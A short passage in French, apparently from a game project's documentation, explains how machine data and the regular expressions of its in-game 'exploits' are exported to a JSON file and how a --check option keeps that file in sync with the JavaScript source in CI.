(`machines.json` à la racine), en encodant les RegExp des exploits sous forme balisée
`{ "__regex__": ..., "__flags__": ... }` reconstructible au chargement. Le jeu, lui, continue de
charger le littéral JS `js/machines.js` (indispensable pour l'ouverture en `file://` sans serveur).
`--check` échoue si `machines.json` a dérivé de `machines.js` (garde de synchronisation pour la CI).

